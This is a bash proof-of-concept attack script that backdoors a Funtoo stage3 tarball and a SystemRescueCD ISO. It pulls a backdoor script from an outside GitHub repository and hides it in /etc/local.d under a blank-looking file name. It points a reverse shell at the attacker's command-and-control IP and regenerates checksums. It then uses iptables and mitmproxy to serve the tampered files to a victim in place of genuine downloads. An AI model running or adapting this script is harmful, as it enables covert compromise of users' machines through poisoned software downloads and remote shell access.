##########as always lots of rooms for improvement, this is just a PoC ############
#################### setup backdoor env.

if test $1;
then
VICTIM_IP=$1
else

echo "Please specify Victim's IP"
echo "Usage poc.sh <victim> <cnc>"
exit

fi

if test $2;
then
CNC=$2
else

echo "Please specify the IP of your command and control server"
echo "Usage poc.sh <victim> <cnc>"
exit

fi



emerge pip cdrtools #include openssl,netcat,wget here if they aren't installed
pip install mitmproxy twisted

#ideally you will set this up on your own system and just wget the backdoored stage3 and iso
#however in this case I will use the compromised network device to setup the backdoored files.

mkdir work
cd work
mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out

wget http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/stage3-latest.tar.xz #replace with current stage3 url
wget http://build.funtoo.org/distfiles/sysresccd/systemrescuecd-x86-4.7.1.iso

mount -oloop ./systemrescuecd-x86-4.7.1.iso ./backdoor-iso-ro
cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
tar -C backdoor-stage3 -xvf ./stage3-latest.tar.xz
unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat

curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/backdoor.sh > backdoor-stage3/etc/local.d/' '
sed -i "s/REPLACEME/$CNC/" backdoor-stage3/etc/local.d/' '

#make sure the IP contained is the IP your reverse shell handler is listening on

cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '

chmod a+x ./backdoor-stage3/etc/local.d/' '
chmod a+x ./backdoor-squash/etc/local.d/' '


##pack backdoored files

cd backdoor-stage3
tar -cJf ../out/stage3-latest.tar.xz *
cd ../backdoor-squash
mksquashfs * ../sysrcd-backdoored.dat
cd ../backdoor-iso-rw

rm sysrcd*
mv ../sysrcd-backdoored.dat ./sysrcd.dat
md5sum sysrcd.dat > sysrcd.md5
mkisofs -o ../out/systemrescuecd-x86-4.7.1.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V systemrescuecd-x86-4.7.1 .

cd ..;ls -l out
########start and fork twisted web server to host the backdoored files###
##you would normally run this somewhere on the internet with a similar domain as the file server
##either that or you can modify dns response to point to this target machine to fool users
##if you specify a CNC outside of the compromised box it will work fine.

echo "twistd Web server started on port 81"

twistd -n web -p 81 --path out&

####setup mitmproxy/mitmdump
#pick victim IP, find what interface it is on, setup iptables rules accordingly for the interface
#Example:
#victim:172.16.10.81
# ip neigh show to 172.16.10.81 
#172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE

if [[ "$(ip neigh show to $VICTIM_IP)" == "" ]]
then INTERFACE="eth0"
else INTERFACE="$(ip neigh show to $VICTIM_IP | awk '{print $3}')"
fi

iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
mitmproxy --anticache -T -s ./redirect.py

echo "Ready as can be, try downloading a target file and see if it works :)"
#profit